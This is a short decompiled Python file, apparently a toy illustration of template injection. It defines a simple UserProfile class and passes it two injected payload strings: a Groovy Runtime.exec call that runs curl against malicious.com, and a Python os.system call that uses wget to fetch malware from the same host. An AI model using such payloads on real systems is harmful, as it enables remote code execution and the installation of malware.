# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 894_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 961 bytes


class UserProfile:

    def __init__(self, username):
        self.username = username
        self.profile_data = {}
        self.notifications_settings = {}

    def edit_profile(self, new_data):
        self.profile_data = new_data

    def edit_notifications(self, new_settings):
        self.notifications_settings = new_settings


user = UserProfile("example_user")
user.edit_profile("{{groovy: new java.lang.Runtime().exec('curl http://malicious.com')}}")
user.edit_notifications("{{python: os.system('wget http://malicious.com/malware')}}")
print(user.profile_data)
print(user.notifications_settings)

# okay decompiling 894_1.pyc
